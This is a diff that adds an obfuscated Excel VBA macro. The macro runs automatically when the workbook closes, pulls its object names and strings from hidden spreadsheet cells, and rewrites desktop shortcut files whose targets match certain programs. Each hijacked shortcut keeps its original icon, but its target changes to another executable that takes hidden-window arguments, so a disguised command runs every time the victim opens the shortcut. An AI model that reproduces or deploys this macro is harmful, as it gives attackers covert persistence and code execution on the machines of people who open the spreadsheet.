@@ -1,0 +1,18 @@
+Sub Auto_Close()
+Set UEyvDnRfh = CreateObject(activeSheet.Range("AX69").value)
+Set PgVrOMhF = CreateObject(activeSheet.Range("BA69").value)
+Set hXHYiW = PgVrOMhF.GetFolder(UEyvDnRfh.SpecialFolders(activeSheet.Range("BD69").value))
+For Each UDyWhtHPO In hXHYiW.Files
+If(InStr(Lcase(UDyWhtHPO), ".lnk")) Then
+Set mkKCjQ = UEyvDnRfh.CreateShortcut(UEyvDnRfh.SPecialFolders(activeSheet.Range("BD69").value) & "\" & UDyWhtHPO.name)
+If(InStr(Lcase(mkKCjQ.targetPath), activeSheet.Range("BG69").value) or InStr(Lcase(mkKCjQ.targetPath), activeSheet.Range("BI69").value) or InStr(Lcase(mkKCjQ.targetPath), activeSheet.Range("BM69").value)) Then
+mkKCjQ.IconLocation = mkKCjQ.targetpath
+mkKCjQ.arguments = "-w " & activeSheet.Range("BQ69").Value & mkKCjQ.targetPath & "'" & activeSheet.Range("BS69").Value
+mkKCjQ.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("BU69").value
+if(Len(mkKCjQ.arguments) < 1023) Then
+mkKCjQ.save
+end if
+end if
+end if
+next UDyWhtHPO
+End Sub
